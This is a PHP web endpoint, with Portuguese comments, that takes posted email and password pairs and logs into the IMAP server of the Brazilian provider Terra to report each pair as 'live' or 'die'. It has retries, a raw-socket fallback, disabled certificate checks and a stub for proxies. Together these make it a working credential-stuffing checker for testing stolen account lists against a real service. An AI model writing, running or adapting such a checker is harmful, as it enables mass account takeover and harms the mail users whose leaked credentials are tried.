<?php
error_reporting(0);
ini_set('display_errors', '0');
ini_set('max_execution_time', '30');
header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');

$action = $_GET['action'] ?? '';

if ($action === 'init') {
    echo json_encode(['status' => 'ok', 'proxies' => []]);
    exit;
}

if ($action === 'check') {
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';
    if ($email === '' || $password === '') {
        echo json_encode(['status' => 'die', 'email' => $email, 'reason' => 'Vazio']);
        exit;
    }
    try {
        echo json_encode(doValidate($email, $password));
    } catch (\Throwable $e) {
        echo json_encode(['status' => 'die', 'email' => $email, 'reason' => 'Erro']);
    }
    exit;
}

echo json_encode(['status' => 'ok']);
exit;

function doValidate(string $email, string $password): array {
    $timeout = 15;

    // Tentativa 1
    $r = tryCurl($email, $password, $timeout);
    if ($r !== null) return $r;
    $r = trySocket($email, $password, $timeout);
    if ($r !== null) return $r;

    // Delay 1.5s e retry
    usleep(1500000);

    // Tentativa 2
    $r = tryCurl($email, $password, $timeout);
    if ($r !== null) return $r;
    $r = trySocket($email, $password, $timeout);
    if ($r !== null) return $r;

    return ['status' => 'die', 'email' => $email, 'reason' => 'Connection failed'];
}

function tryCurl(string $email, string $password, int $timeout): ?array {
    if (!extension_loaded('curl')) return null;
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => 'imaps://imap.terra.com.br:993/INBOX',
        CURLOPT_USERNAME => $email,
        CURLOPT_PASSWORD => $password,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => 0,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => $timeout,
        CURLOPT_CONNECTTIMEOUT => $timeout,
        CURLOPT_NOSIGNAL => 1,
    ]);
    $result = curl_exec($ch);
    $errno = curl_errno($ch);
    curl_close($ch);
    if ($errno === 67) return ['status' => 'die', 'email' => $email, 'reason' => 'Invalid credentials'];
    if ($result !== false) return ['status' => 'live', 'email' => $email, 'reason' => 'OK'];
    return null;
}

function trySocket(string $email, string $password, int $timeout): ?array {
    $socket = @fsockopen('ssl://imap.terra.com.br', 993, $errno, $errstr, $timeout);
    if ($socket === false) return null;
    stream_set_timeout($socket, $timeout);
    $greeting = @fgets($socket, 8192);
    if (!$greeting || stripos($greeting, 'OK') === false) { fclose($socket); return null; }
    $safe_email = addslashes($email);
    $safe_pass = addslashes($password);
    fwrite($socket, "A1 LOGIN \"{$safe_email}\" \"{$safe_pass}\"\r\n");
    $response = '';
    $deadline = microtime(true) + $timeout;
    while (!feof($socket)) {
        $line = @fgets($socket, 8192);
        if ($line === false) break;
        $response .= $line;
        if (strpos(trim($line), 'A1 ') === 0) break;
        if (microtime(true) > $deadline) break;
    }
    @fwrite($socket, "A2 LOGOUT\r\n");
    fclose($socket);
    if (preg_match('/A1\s+OK/i', $response)) return ['status' => 'live', 'email' => $email, 'reason' => 'OK'];
    if (preg_match('/A1\s+NO/i', $response)) return ['status' => 'die', 'email' => $email, 'reason' => 'Invalid credentials'];
    if (preg_match('/A1\s+BAD/i', $response)) return ['status' => 'die', 'email' => $email, 'reason' => 'Bad command'];
    return null;
}
